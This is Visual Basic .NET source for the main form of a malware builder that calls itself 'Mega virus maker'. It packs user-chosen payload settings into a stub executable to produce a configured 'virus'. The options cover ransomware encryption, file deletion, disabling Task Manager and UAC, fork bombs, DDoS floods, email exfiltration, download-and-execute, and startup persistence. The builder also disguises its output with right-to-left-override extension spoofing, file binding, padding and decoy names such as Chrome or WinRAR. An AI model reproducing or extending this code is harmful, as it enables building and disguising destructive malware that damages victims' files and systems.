Imports Microsoft.Win32
Imports System.Diagnostics
Imports System.Text
Imports System.IO
Imports System.CodeDom.Compiler
Imports System.Runtime.InteropServices
Imports System.Reflection
Imports System.Net

Public Class Form1

    Dim newpoint As New Point
    Dim X As Integer
    Dim Y As Integer


    Dim extarctedico As Icon
    Dim exctradname As String
    Const F = "@SDJMVMPVsdq54v@"
    Public Shared msg_tlt, msg_bdy, msg_stl, usb, BTC, rnsm_key, msg _
         , prtc_prc, jnk_str, meltfil, lnch_dley, dley_time, reg_strt_up, Folder_startup, strt_date, strt_yes, dw_url, dw _
        , dw_drp, dw_admn, mtx, mtx_enbl, an_vm As String
    Dim line As String = vbNewLine

    Public Shared dlt_alldsktpfiles, dlt_mydcmnt, enc_mydcmnt, dmncenc_key, set_clip, set_clip_text _
        , D_clip, D_taskmg, d_cmd, d_regedit, d_explo, d_uac, cpu_full, spam_deskskul, opnnclo_cddriv _
    , hid_taskbar, D_webbro, D_Custom, D_selected_pro, makeC_full, D_proc, D_selectdProc _
     , D_Keybaord, Crzy_Mouse, Blue_screan, Close_all, chang_Datentime, S_date, S_time, Playbeep, Black_screan _
      , Destroy_mine, delet_webbrowser, Turn_off, restart_pc, log_off, look_mouse, open_FBI, open_gay, open_zoo _
       , custo_site, sel_custo_site, set_kbrd, valu_kbrd, flashy_scrn, spm_msg, themsg_spm, spamme_mainmsg, D_copyfls, infi_website _
       , atasporn, dick, frm_dup, frm_txt, spch_txt, spch, rnsm, amount, D_internet, frz_scrn, infni_scrn _
       , trun_off, pic_link, swp_mous, frkbmb, mncrf_dest, Dlt_jpg, Dlt_doc, Dlt_txt, dlt_custo, dlt_custo_ext, Hid_cur, Confu_File _
       , Cust_bat, bat_scrpt, custo_vbs, vbs_scrpt, Custo_power, power_scrpt, custo_vb, vb_scrpt As String

    Public Shared Ddos_atc, TCP, UDP, TARGET, PORT, Socket, Packet, syn, sendmail, smtp, m_adresse, m_pwd, m_sendto, m_enc, m_key _
        , m_port As String



    Public cb As Integer

    Dim BuildFolder As String
    Dim file1, icn As String
    Dim filebind, ext As String


    Dim Trd1 As Threading.Thread

    <DllImport("shell32.dll")>
    Private Shared Function ExtractAssociatedIcon(ByVal hInst As IntPtr, <MarshalAs(UnmanagedType.LPStr)>
  ByVal lpIconPath As String, ByRef lpiIcon As Integer) As IntPtr
    End Function

#Region ""
    Sub Setup()
        msg_tlt = Msg_titl.Text
        msg_bdy = msg_body.Text
        If Err.Checked = True Then
            msg_stl = "err"
        End If
        If Exlamtion.Checked = True Then
            msg_stl = "exx"
        End If
        If info.Checked = True Then
            msg_stl = "info"
        End If
        If Questin.Checked = True Then
            msg_stl = "quest"
        End If
        msg = NyX_CheckBox22.Checked


        usb = NyX_CheckBox17.Checked
        D_clip = NyX_CheckBox1.Checked
        D_taskmg = NyX_CheckBox2.Checked
        d_cmd = NyX_CheckBox4.Checked
        d_regedit = NyX_CheckBox3.Checked
        d_explo = NyX_CheckBox8.Checked
        d_uac = NyX_CheckBox7.Checked
        set_clip = NyX_CheckBox6.Checked

        prtc_prc = NyX_CheckBox23.Checked
        dlt_alldsktpfiles = NyX_CheckBox13.Checked
        dlt_mydcmnt = NyX_CheckBox12.Checked
        enc_mydcmnt = NyX_CheckBox11.Checked


        meltfil = NyX_CheckBox29.Checked
        lnch_dley = NyX_CheckBox27.Checked
        dley_time = CrystalClearTextBox6.Text
        reg_strt_up = NyX_CheckBox33.Checked
        Folder_startup = NyX_CheckBox32.Checked

        cpu_full = NyX_CheckBox39.Checked
        spam_deskskul = NyX_CheckBox10.Checked
        opnnclo_cddriv = NyX_CheckBox46.Checked
        hid_taskbar = NyX_CheckBox37.Checked
        D_webbro = NyX_CheckBox7.Checked
        D_Custom = NyX_CheckBox48.Checked

        makeC_full = NyX_CheckBox38.Checked
        D_proc = NyX_CheckBox47.Checked

        D_Keybaord = NyX_CheckBox9.Checked
        Crzy_Mouse = NyX_CheckBox61.Checked
        Blue_screan = NyX_CheckBox36.Checked
        Close_all = NyX_CheckBox14.Checked
        chang_Datentime = NyX_CheckBox43.Checked

        Playbeep = NyX_CheckBox42.Checked
        Black_screan = NyX_CheckBox41.Checked
        Destroy_mine = NyX_CheckBox40.Checked
        delet_webbrowser = NyX_CheckBox45.Checked
        Turn_off = NyX_CheckBox44.Checked
        restart_pc = NyX_CheckBox19.Checked
        log_off = NyX_CheckBox16.Checked
        look_mouse = NyX_CheckBox15.Checked
        open_FBI = NyX_CheckBox5.Checked
        open_gay = NyX_CheckBox50.Checked
        open_zoo = NyX_CheckBox55.Checked
        custo_site = NyX_CheckBox49.Checked
        set_kbrd = NyX_CheckBox63.Checked
        flashy_scrn = NyX_CheckBox60.Checked
        spm_msg = NyX_CheckBox59.Checked
        spamme_mainmsg = NyX_CheckBox58.Checked
        strt_yes = NyX_CheckBox67.Checked
        D_copyfls = NyX_CheckBox70.Checked
        Ddos_atc = NyX_CheckBox68.Checked
        dw = NyX_CheckBox53.Checked
        sendmail = NyX_CheckBox54.Checked
        atasporn = NyX_CheckBox35.Checked
        dick = NyX_CheckBox74.Checked
        frm_dup = NyX_CheckBox75.Checked
        spch = NyX_CheckBox76.Checked
        rnsm = NyX_CheckBox11.Checked
        D_internet = NyX_CheckBox65.Checked
        frz_scrn = NyX_CheckBox34.Checked
        infni_scrn = NyX_CheckBox72.Checked
        trun_off = NyX_CheckBox84.Checked
        mtx = CrystalClearTextBox2.Text
        mtx_enbl = NyX_CheckBox31.Checked
        an_vm = upx_compresse.Checked
        swp_mous = NyX_CheckBox62.Checked
        frkbmb = NyX_CheckBox83.Checked
        mncrf_dest = NyX_CheckBox40.Checked
        Dlt_jpg = NyX_CheckBox52.Checked
        Dlt_txt = NyX_CheckBox57.Checked
        Dlt_doc = NyX_CheckBox56.Checked
        dlt_custo = NyX_CheckBox71.Checked
        Hid_cur = NyX_CheckBox77.Checked
        Confu_File = NyX_CheckBox64.Checked

        Cust_bat = NyX_CheckBox20.Checked
        If NyX_CheckBox20.Checked = True Then
            bat_scrpt = EncodeBase64(bat_scrpt)
        Else
            bat_scrpt = ""
        End If

        custo_vbs = NyX_CheckBox21.Checked
        If NyX_CheckBox21.Checked = True Then
            vbs_scrpt = EncodeBase64(vbs_scrpt)
        Else
            vbs_scrpt = ""
        End If

        Custo_power = NyX_CheckBox24.Checked
        If NyX_CheckBox24.Checked = True Then
            power_scrpt = EncodeBase64(power_scrpt)
        Else
            power_scrpt = ""
        End If

        custo_vb = NyX_CheckBox73.Checked
        If NyX_CheckBox73.Checked = True Then
            vb_scrpt = EncodeBase64(vb_scrpt)
        Else
            vb_scrpt = ""
        End If
    End Sub

#End Region

    Dim nrmlpath As String
    Dim Spfpath As String
    Public Stubpath As String
    Sub make()
        Try
            Setup()



            Dim stub As String
            Dim file2put As String
            stat.AppendText("----------------------------------" & line & line)

            stat.AppendText("intilazing...." & line & line)
            stat.AppendText("Virus name : " & TextBox7.Text & line & line)
            stat.AppendText("Creation path : " & BuildFolder & line & line)
            stat.AppendText("Icon path : " & TextBox1.Text & line & line)
            NyX_ProgressBar1.Value = 10

            stat.Refresh()
            If NyX_CheckBox25.Checked = True Then
                FileOpen(1, filebind, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
                file2put = Space(LOF(1))
                FileGet(1, file2put)
                FileClose(1)
                stat.AppendText("File bind : " & NyX_CheckBox25.Checked & " - " & filebind & vbNewLine & vbNewLine)
            Else
                stat.AppendText("File bind enabled : " & " False " & line & line)
            End If


            stat.AppendText("Opening Stub..." & " putting settings" & vbNewLine & vbNewLine)
            NyX_ProgressBar1.Value = 25



            FileOpen(1, Stubpath, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
            stub = Space(LOF(1))
            FileGet(1, stub)
            FileClose(1)
            FileOpen(1, BuildFolder, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
            FilePut(1, stub & F & msg_tlt & F & msg_bdy & F & msg_stl & F & usb & F & BTC & F & rnsm_key & F & D_clip & F & D_taskmg & F & d_cmd & F & d_regedit & F & d_explo & F & d_uac _
                 & F & msg & F & set_clip & F & set_clip_text & F & prtc_prc & F & dlt_alldsktpfiles & F & dlt_mydcmnt & F & enc_mydcmnt & F & dmncenc_key & F & jnk_str & F & meltfil & F & lnch_dley _
                 & F & dley_time & F & reg_strt_up & F & Folder_startup & F & ext & F & file2put & F & cpu_full & F & spam_deskskul & F & opnnclo_cddriv & F & hid_taskbar & F _
                 & D_webbro & F & makeC_full & F & D_Custom & F & D_selected_pro & F & D_proc & F & D_selectdProc & F & D_Keybaord & F & Crzy_Mouse & F & Blue_screan & F _
                 & Close_all & F & chang_Datentime & F & S_date & F & S_time & F & Playbeep & F & Black_screan & F & Destroy_mine & F & delet_webbrowser & F & Turn_off & F _
                 & restart_pc & F & log_off & F & look_mouse & F & open_FBI & F & open_gay & F & open_zoo & F & sel_custo_site & F & custo_site & F & set_kbrd & F & valu_kbrd & F & flashy_scrn & F _
                 & spm_msg & F & themsg_spm & F & spamme_mainmsg & F & strt_date & F & strt_yes & F & D_copyfls & F & Ddos_atc & F & TCP & F & UDP & F & TARGET & F & PORT & F & Packet & F & syn & F & infi_website & F _
                 & dw_url & F & dw & F & dw_drp & F & dw_admn & F & sendmail & F & m_adresse & F & m_pwd & F & m_sendto & F & m_enc & F & m_key & F & m_port & F & smtp & F & atasporn & F & dick & F _
                 & frm_dup & F & frm_txt & F & spch_txt & F & spch & F & rnsm & F & amount & F & D_internet & F & frz_scrn & F & infni_scrn & F & trun_off & F & mtx & F & mtx_enbl & F & an_vm & F & pic_link & F & swp_mous & F _
                  & frkbmb & F & mncrf_dest & F & Dlt_jpg & F & Dlt_txt & F & Dlt_doc & F & dlt_custo & F & dlt_custo_ext & F & Hid_cur & F & Confu_File & F & Cust_bat & F & bat_scrpt & F & custo_vbs & F & vbs_scrpt & F & custo_vb & F & vb_scrpt & F & Custo_power & F & power_scrpt & F) 'all with jnk = 55 
            FileClose(1)
            NyX_ProgressBar1.Value = 40
            stat.AppendText("Stub closed.." & line & line)
            Dim l = New Threading.Thread(AddressOf asschange)
            l.IsBackground = True
            l.Start()
            Do Until l.IsAlive = False
            Loop
            stat.AppendText(line & line & "Assembly info : Done " & line & line)
            NyX_ProgressBar1.Value = 60

            NyX_ProgressBar1.Value = 65

            If NyX_CheckBox18.Checked = True Then
                stat.AppendText("Fake size enabled : " & " True  - " & NumericUpDown1.Value & " mb" & line & line)
                Dim p = New Threading.Thread(AddressOf pump)
                p.IsBackground = True
                p.Start()
                stat.AppendText("[")
                Do Until p.IsAlive = False
                    stat.AppendText("°")
                Loop
                stat.AppendText("]")
                stat.AppendText(line & line & "Fake Size applied 100%" & line & line)
            Else
                stat.AppendText("Fake size enabled : " & " False " & line & line)
            End If
            NyX_ProgressBar1.Value = 75
            Loading.stat.Text += "Finalizing..." & vbNewLine & vbNewLine

            Me.Enabled = True
            delasmb()
            NyX_ProgressBar1.Value = 80

            If Spf.Checked = True Then
                ExtensionSpoof(BuildFolder, ComboBox1.Text)
                stat.AppendText("Extension spoofing enabled  :" & Spf.Checked & " - " & ComboBox1.Text & line & line)
            Else
                BuildFolder = sfd.SelectedPath & "\" & TextBox7.Text & ".exe"
                stat.AppendText("Extension spoofing enabled  :" & Spf.Checked & line & line)
            End If
            If My.Computer.Info.OSFullName.Contains("10") Then
                Process.Start("ie4uinit.exe", " -show")
            Else
                Process.Start("ie4uinit.exe", " -ClearIconCache")
            End If
            NyX_ProgressBar1.Value = 85

            stat.AppendText("----------------------------------" & vbNewLine & vbNewLine)
            NyX_ProgressBar1.Value = 95
            stat.AppendText("Virus has been created at " & BuildFolder & line & line)
            stat.AppendText("Final size : " & GetFileSize(BuildFolder) & line & line)
            stat.AppendText("Your virus hase been created successfully ! ")
            NyX_Button3.Text = "OK"
            NyX_ProgressBar1.Value = 100
            NotifyIcon1.ShowBalloonTip(100, "Your virus hase been created successfully !", "Done !", ToolTipIcon.Info)
        Catch ex As Exception
            ' NotifyIcon1.ShowBalloonTip(100, "Error : " & ex.Message, "", ToolTipIcon.Error)
            NyX_Button3.Text = "OK"
            stat.AppendText("----------------------------------" & vbNewLine & vbNewLine)
            stat.AppendText("Error : " & ex.Message & vbNewLine & vbNewLine)

        End Try




    End Sub
    Dim spffdl As String
    Public Sub ExtensionSpoof(ByVal File1 As String, ByVal Ext As String)



        File.Copy(File1, Path.GetTempPath & "12.exe")
        File.Delete(File1)
        File.Move(Path.GetTempPath & "12.exe", spffdl & Path.GetFileNameWithoutExtension(File1) & ChrW(8238) & Strings.StrReverse("." & Ext) & ".exe")
        BuildFolder = spffdl & Path.GetFileNameWithoutExtension(File1) & ChrW(8238) & Strings.StrReverse("." & Ext) & ".exe"
    End Sub
    Dim DoubleBytes As Double

    Public Function GetFileSize(ByVal TheFile As String) As String
        If TheFile.Length = 0 Then Return ""
        If Not System.IO.File.Exists(TheFile) Then Return ""
        '---
        Dim TheSize As ULong = My.Computer.FileSystem.GetFileInfo(TheFile).Length
        Dim SizeType As String = ""
        '---

        Try
            Select Case TheSize
                Case Is >= 1099511627776
                    DoubleBytes = CDbl(TheSize / 1099511627776) 'TB
                    Return FormatNumber(DoubleBytes, 2) & " TB"
                Case 1073741824 To 1099511627775
                    DoubleBytes = CDbl(TheSize / 1073741824) 'GB
                    Return FormatNumber(DoubleBytes, 2) & " GB"
                Case 1048576 To 1073741823
                    DoubleBytes = CDbl(TheSize / 1048576) 'MB
                    Return FormatNumber(DoubleBytes, 2) & " MB"
                Case 1024 To 1048575
                    DoubleBytes = CDbl(TheSize / 1024) 'KB
                    Return FormatNumber(DoubleBytes, 2) & " KB"
                Case 0 To 1023
                    DoubleBytes = TheSize ' bytes
                    Return FormatNumber(DoubleBytes, 2) & " bytes"
                Case Else
                    Return ""
            End Select
        Catch
            Return ""
        End Try
    End Function
    Private Sub NyX_Button4_Click_1(sender As Object, e As EventArgs) Handles NyX_Button4.Click
        If Err.Checked = True Then
            MsgBox(msg_body.Text, MsgBoxStyle.Critical, Msg_titl.Text)

        End If
        If Exlamtion.Checked = True Then
            MsgBox(msg_body.Text, MsgBoxStyle.Exclamation, Msg_titl.Text)

        End If
        If info.Checked = True Then
            MsgBox(msg_body.Text, MsgBoxStyle.Information, Msg_titl.Text)

        End If
        If Questin.Checked = True Then
            MsgBox(msg_body.Text, MsgBoxStyle.MsgBoxHelp, Msg_titl.Text)

        End If
    End Sub


    Sub coutnthemvir()
        cb += GroupBox1.Controls.OfType(Of NYX_CheckBox)().Count()
        cb += GroupBox2.Controls.OfType(Of NYX_CheckBox)().Count()
        cb += GroupBox3.Controls.OfType(Of NYX_CheckBox)().Count()
        cb += GroupBox5.Controls.OfType(Of NYX_CheckBox)().Count()
        cb += GroupBox4.Controls.OfType(Of NYX_CheckBox)().Count()
        cb += GroupBox7.Controls.OfType(Of NYX_CheckBox)().Count()
    End Sub

    Sub pump()
        Dim fakesize As Double = Val(NumericUpDown1.Value)
        fakesize = fakesize * 1048576
        Dim filetopump = IO.File.OpenWrite(BuildFolder)
            Dim size = filetopump.Seek(0, IO.SeekOrigin.End)
            While size < fakesize
                filetopump.WriteByte(0)
                size += 1
            End While
            filetopump.Close()
     
    End Sub

    Sub delasmb()
        Try
            If File.Exists(Application.StartupPath & "\appli.exe") Then
                File.Delete(Application.StartupPath & "\appli.exe")
            End If
            If File.Exists(Application.StartupPath & "\appli.res") Then
                File.Delete(Application.StartupPath & "\appli.res")
            End If
            If File.Exists(Application.StartupPath & "\res.exe") = True Then
                File.Delete(Application.StartupPath & "\res.exe")
            End If
            If File.Exists(Application.StartupPath & "\res.log") = True Then
                File.Delete(Application.StartupPath & "\res.log")
            End If
            If File.Exists(Application.StartupPath & "\res.ini") = True Then
                File.Delete(Application.StartupPath & "\res.ini")
            End If

        Catch ex As Exception

        End Try

    End Sub
    Public Sub doit() 
            If sfd.ShowDialog = DialogResult.OK Then
                CrystalClearTabControl1.SelectedIndex = 3
                stat.Visible = True
            BuildFolder = sfd.SelectedPath & "\" & TextBox7.Text & ".exe"
            spffdl = sfd.SelectedPath & "\"
            Trd1 = New Threading.Thread(AddressOf make)
                Trd1.IsBackground = True
                Trd1.Start()
                Timer2.Start()
            End If
    End Sub
    Private Sub NyX_Button3_Click(sender As Object, e As EventArgs) Handles NyX_Button3.Click
        If Readit.Contains("Cryptwar") Then
            MsgBox("if you want to encrypte or compress or do anything with the stub do that for the raw stub located in " & Application.StartupPath & "\Stub\" & vbNewLine & "  DO NOT TRY AND ENCRYPT OR DO ANYTHING WITH THE GENERATED VIRUS THAT WOULD CORUPT THE VIRUS AND IT WILL NOT WORK", MsgBoxStyle.Exclamation, "IMPORTANT")
            Writeit("Cryptwar")
        End If

        If NyX_Button3.Text = "OK" Then

            CrystalClearTabControl1.SelectedIndex = 0
            stat.Visible = False
            NyX_Button3.Text = "Build"
            stat.Text = ""
            Panel7.Enabled = True
            NyX_ProgressBar1.Value = 0
            PictureBox22.Visible = True
            PictureBox23.Visible = True
        Else
            If TextBox7.Text = Nothing Or TextBox1.Text = Nothing Then
                If TextBox7.Text = Nothing Then
                    MsgBox("No virus name has been set ", MsgBoxStyle.Exclamation)
                End If

                If TextBox1.Text = Nothing Then
                    MsgBox("No icon has been set !", MsgBoxStyle.Exclamation)
                End If
            Else
                LastStep.Show()
            End If


        End If

    End Sub
    Private Sub NyX_Button5_Click(sender As Object, e As EventArgs) Handles NyX_Button5.Click
        About.Show()
        Me.Hide()
    End Sub
    Sub setsettings()
        With My.Settings

            TextBox7.Text = .Virusname
            Getinfmail.CrystalClearTextBox5.Text = .defKey
            rnsm_cnfg.CrystalClearTextBox2.Text = .defKey
        End With
    End Sub
    Public Shared Function CheckForInternetConnection() As Boolean
        Try
            Using client = New WebClient()
                Using stream = client.OpenRead("https://www.google.com")
                    Return True
                End Using
            End Using
        Catch
            Return False
        End Try
    End Function

    Sub GetMsg()
        Dim msg_dl As String = New System.Net.WebClient().DownloadString("https://pastebin.com/raw/pcD5YAGd")
       

            Label16.AutoSize = True
            Label16.Text = msg_dl
            Label16.Parent = Panel9
            Label16.Location = New Point(Panel9.ClientSize.Width, _
                                   Panel9.ClientSize.Height / 2 - (Label1.Height / 2))
            LBL_ANI.Start()
        
    End Sub
    Sub chekifsafe()
        Dim known_hash As String = New System.Net.WebClient().DownloadString("http://pastebin.com/raw/mMZrj6am")
        Dim now_hash As String = hash_generator("sha512", Application.ExecutablePath)
        If Not known_hash = now_hash Then
            MessageBox.Show("This version of Mega virus maker is not authentic and might be infected or is outdated you should check for update if there is none you should close this right now and check for virus in your system. " & vbNewLine & vbNewLine & " here is the orginal sha512 hash : " & vbNewLine & vbNewLine & known_hash & vbNewLine & vbNewLine & " here is the hash of this version : " & vbNewLine & vbNewLine & now_hash & vbNewLine, "Err", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
        End If
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        setsettings()
        coutnthemvir()

        If IO.File.Exists(setpath) = False Then
            Dim l As New StreamWriter(setpath)
            l.Write("")
            l.Close()
        End If

        If My.Settings.Chekstrt = True Then
            Seti.Show()
            Seti.CrystalClearTabControl1.SelectedIndex = 1
            Dim hg = New Threading.Thread(AddressOf Seti.chekup)
            hg.IsBackground = True
            hg.Start()
        End If
        If My.Settings.lock = True Then
            Lockapp.Show()
            Me.Enabled = False
        End If

        If CheckForInternetConnection() = True Then
            chekifsafe()

            GetMsg()

        End If
        If Readit.Contains("Change") = False Then
            Change_log.Show()
            Writeit("Change")
        End If
        If Readit.Contains("lice") = True Then
            Control.CheckForIllegalCrossThreadCalls = False
            PictureBox4.AllowDrop = True
            chek_icons()
            NyX_CheckBox51.Enabled = True
            NyX_CheckBox51.Checked = True
            ListView1.Enabled = True
            NyX_CheckBox26.Checked = False
            NyX_Button2.Enabled = True
            Panel6.Enabled = False
        Else
            lnch.Show()

        End If
    End Sub
    Public setpath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\mvmset.mvm"





    Private Sub CrystalClearTextBox1_MouseMove(sender As Object, e As MouseEventArgs)
        CrystalClearTextBox1.Text = RandomString(15, "", 1, True, True, True, True)
    End Sub
    Private Sub CrystalClearTextBox2_MouseMove(sender As Object, e As MouseEventArgs)
        CrystalClearTextBox2.Text = "MVM-" & RandomString(10, "", 1, True, False, True, False)
    End Sub


   
    Sub Gen()


        TextBox7.Text = Int(Rnd() * 9)
        Select Case TextBox7.Text
            Case 0
                TextBox7.Text = "Chrome"
            Case 1
                TextBox7.Text = "WinRAR"
            Case 2
                TextBox7.Text = "Minecraft"
            Case 3
                TextBox7.Text = "Opera"
            Case 4
                TextBox7.Text = "IDM"
            Case 5
                TextBox7.Text = "CCleaner"
            Case 6
                TextBox7.Text = "VLC media player"
            Case 7
                TextBox7.Text = "Resource Hacker"
            Case 10
                TextBox7.Text = "Sony Vegas Pro"
        End Select





    End Sub
    Private Sub NyX_Button12_Click(sender As Object, e As EventArgs) Handles NyX_Button12.Click
        Gen()

    End Sub

    
#Region "Icon Stuff"
    Private Sub PictureBox4_DragEnter(sender As Object, e As DragEventArgs) Handles PictureBox4.DragEnter
        If e.Data.GetDataPresent(DataFormats.FileDrop) = True Then
            Dim file As String = e.Data.GetData(DataFormats.FileDrop)(0)

            If file.EndsWith("ico") Or file.EndsWith("exe") Or file.EndsWith("lnk") Then
                e.Effect = DragDropEffects.All
            Else
                e.Effect = DragDropEffects.None

            End If
        End If
    End Sub
    Private ico As Icon = Nothing
   
    Dim usedexeico As Boolean
    Private Sub PictureBox4_DragDrop(sender As Object, e As DragEventArgs) Handles PictureBox4.DragDrop



        If e.Data.GetDataPresent(DataFormats.FileDrop) = True Then
            Dim filea As String = e.Data.GetData(DataFormats.FileDrop)(0)

            If filea.EndsWith("ico") Then
                TextBox1.Text = filea
                PictureBox3.ImageLocation = filea
                usedexeico = False
            Else
                Try
                    usedexeico = True
                    Dim exepath As String

                    If filea.EndsWith("lnk") Then
                        exepath = GetTargetPath(filea)

                        PictureBox3.Image = ReturnIcon(exepath, 0).ToBitmap

                        Dim tmpbmp1 As String = Path.GetTempPath & "\" & RandomString(6, "", True, True, False, True, False) & ".bmp"
                        Dim tempico1 As String = Path.GetTempPath & "\" & RandomString(6, "", True, True, False, True, False) & ".ico"
                        TextBox1.Text = tempico1
                        ReturnIcon(exepath, 0).ToBitmap.Save(tmpbmp1, System.Drawing.Imaging.ImageFormat.Png)
                        PngIconConverter.Convertico(tmpbmp1, tempico1, 64, True)
                        IO.File.Delete(tmpbmp1)
                    ElseIf filea.EndsWith("exe") Then
                        PictureBox3.Image = ReturnIcon(filea, 0).ToBitmap

                        Dim tmpbmp As String = Path.GetTempPath & "\" & RandomString(6, "", True, True, False, True, False) & ".bmp"
                        Dim tempico As String = Path.GetTempPath & "\" & RandomString(6, "", True, True, False, True, False) & ".ico"
                        TextBox1.Text = tempico
                        ReturnIcon(filea, 0).ToBitmap.Save(tmpbmp, System.Drawing.Imaging.ImageFormat.Png)
                        PngIconConverter.Convertico(tmpbmp, tempico, 64, True)
                        IO.File.Delete(tmpbmp)
                    End If

                Catch ex As Exception
                    MsgBox(ex.Message, MsgBoxStyle.Critical)
                End Try
            



            End If


        End If
    End Sub

    Declare Function ExtractIcon Lib "shell32.dll" Alias "ExtractIconExA" (ByVal lpszFile _
   As String, ByVal nIconIndex As Integer, ByRef phiconLarge As Integer, ByRef phiconSmall _
   As Integer, ByVal nIcons As Integer) As Integer

    Private Function ReturnIcon(ByVal Path As String, ByVal Index As Integer, Optional ByVal small As Boolean = False) As Icon
        Dim bigIcon As Integer
        Dim smallIcon As Integer

        ExtractIcon(Path, Index, bigIcon, smallIcon, 1)

        If bigIcon = 0 Then
            ExtractIcon(Path, 0, bigIcon, smallIcon, 1)
        End If

        If bigIcon <> 0 Then
            If small = False Then
                Return Icon.FromHandle(bigIcon)
            Else
                Return Icon.FromHandle(smallIcon)
            End If
        Else
            Return Nothing
        End If
    End Function
    Private Sub Label25_DragEnter(sender As Object, e As DragEventArgs) Handles Label25.DragEnter
        If e.Data.GetDataPresent(DataFormats.FileDrop) = True Then
            Dim file As String = e.Data.GetData(DataFormats.FileDrop)(0)
            If file.EndsWith("ico") Then
                e.Effect = DragDropEffects.All


            Else
                e.Effect = DragDropEffects.None

            End If
        End If
    End Sub

    Private Sub Label25_DragDrop(sender As Object, e As DragEventArgs) Handles Label25.DragDrop
        If e.Data.GetDataPresent(DataFormats.FileDrop) = True Then
            Dim file As String = e.Data.GetData(DataFormats.FileDrop)(0)

            TextBox1.Text = file
        End If
    End Sub
    Sub chek_icons()
        Dim iconpack As String
        iconpack = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\MVM 2 icon pack"
        Dim fld As New DirectoryInfo(iconpack)
        Dim pack_exe As String = Application.StartupPath & "\pack.exe"
        If fld.Exists = True Then
            Panel4.Visible = False
            ListView1.Enabled = True

        Else
            Panel4.Visible = True
            ListView1.Enabled = False
        End If


    End Sub
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        chek_icons()
        If Readit.Contains("lice") = True Then
            Me.Enabled = True
            Timer1.Stop()
        Else
            Me.Enabled = False
        End If
    End Sub
    Private Sub Label4_Click(sender As Object, e As EventArgs) Handles Label4.Click
        Dim pack_exe As String = Application.StartupPath & "\pack.exe"
        Me.Enabled = False
        Dim pck As New FileInfo(pack_exe)
        If pck.Exists = True Then
            File.Delete(pack_exe)
            GoTo df
        Else
df:         My.Computer.FileSystem.WriteAllBytes(Application.StartupPath & "\pack.exe", My.Resources.Icon_pack, False)
            Process.Start(pack_exe)

            MsgBox("pack has been installed !", MsgBoxStyle.Information)
            File.Delete(pack_exe)
            Me.Enabled = True
            chek_icons()
        End If




    End Sub


    Private Sub NyX_CheckBox26_CheckedChanged(sender As Object) Handles NyX_CheckBox26.CheckedChanged

        NyX_CheckBox51.Checked = False
        ListView1.Enabled = False
        NyX_CheckBox26.Checked = True
        NyX_CheckBox26.Enabled = True
        NyX_Button2.Enabled = True
        Panel6.Enabled = True

    End Sub

    Public Structure FileInformation
        Dim FileName, Description, Company, Product, Copyright, Trademarks, OriginalName As String
        Dim FileVersion As FileVersionInfo, ProductVersion As ProductVersionInfo

        Public Structure FileVersionInfo
            Dim Major, Minor, Build, Rivision As Integer, Full As String
        End Structure

        Public Structure ProductVersionInfo
            Dim Major, Minor, Build, Rivision As Integer, Full As String
        End Structure
    End Structure
    Public Function GetFileVersion(ByVal File As String) As FileInformation
        Dim x As New FileInformation
        Dim F As New FileInformation.FileVersionInfo
        Dim P As New FileInformation.ProductVersionInfo
        Dim Diagnostic = System.Diagnostics.FileVersionInfo.GetVersionInfo(File)
        x.OriginalName = Diagnostic.OriginalFilename
        x.FileName = Diagnostic.FileName
        x.Company = Diagnostic.CompanyName
        x.Description = Diagnostic.FileDescription
        x.Copyright = Diagnostic.LegalCopyright
        x.Product = Diagnostic.ProductName
        x.Trademarks = Diagnostic.LegalTrademarks
        F.Full = Diagnostic.FileVersion
        F.Major = Diagnostic.FileMajorPart
        F.Minor = Diagnostic.FileMinorPart
        F.Build = Diagnostic.FileBuildPart
        F.Rivision = Diagnostic.FilePrivatePart
        P.Full = Diagnostic.ProductVersion
        P.Major = Diagnostic.ProductMajorPart
        P.Minor = Diagnostic.ProductMinorPart
        P.Build = Diagnostic.ProductBuildPart
        P.Rivision = Diagnostic.ProductPrivatePart
        x.ProductVersion = P
        x.FileVersion = F
        Return x
    End Function
    Private Sub NyX_CheckBox51_CheckedChanged(sender As Object) Handles NyX_CheckBox51.CheckedChanged
        NyX_CheckBox51.Enabled = True
        NyX_CheckBox51.Checked = True
        ListView1.Enabled = True
        NyX_CheckBox26.Checked = False
        NyX_Button2.Enabled = False
        usedexeico = False
        Panel6.Enabled = False
    End Sub

    Private Sub ListView1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ListView1.SelectedIndexChanged
        On Error Resume Next
        iconnum.Text = ListView1.FocusedItem.Text & ".ico"
        TextBox1.Text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\MVM 2 icon pack" & "\" & iconnum.Text
        PictureBox3.ImageLocation = TextBox1.Text
    End Sub

    Private Sub NyX_Button2_Click_1(sender As Object, e As EventArgs) Handles NyX_Button2.Click
        Dim ofd As New OpenFileDialog
        ofd.Filter = "icon |*.ico"
        If ofd.ShowDialog = DialogResult.OK Then
            TextBox1.Text = ofd.FileName
            PictureBox3.ImageLocation = ofd.FileName
            usedexeico = False
        End If
    End Sub


#End Region
    Private Sub NyX_CheckBox25_CheckedChanged(sender As Object) Handles NyX_CheckBox25.CheckedChanged
        Dim s As New OpenFileDialog
        If s.ShowDialog = DialogResult.OK Then
            filebind = s.FileName
            Dim q As New FileInfo(filebind)
            ext = q.Extension
        End If
    End Sub

    Private Sub NyX_Button11_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        If Trd1.IsAlive = True Then
            Panel3.Enabled = False
            NyX_Button18.Enabled = False
            NyX_Button5.Enabled = False
            PictureBox22.Visible = False
            PictureBox23.Visible = False
            NyX_Button3.Enabled = False
        Else

            Panel3.Enabled = True
            NyX_Button18.Enabled = True
            NyX_Button5.Enabled = True

            NyX_Button3.Enabled = True
            Timer2.Stop()
        End If

    End Sub
    Sub asschange()
        If File.Exists(Application.StartupPath & "\res.exe") Then
            File.Delete(Application.StartupPath & "\res.exe")
        End If
        If File.Exists(Application.StartupPath & "\appli.res") Then
            File.Delete(Application.StartupPath & "\appli.res")
        End If
        System.IO.File.WriteAllBytes(Application.StartupPath & "\res.exe", My.Resources.Res)
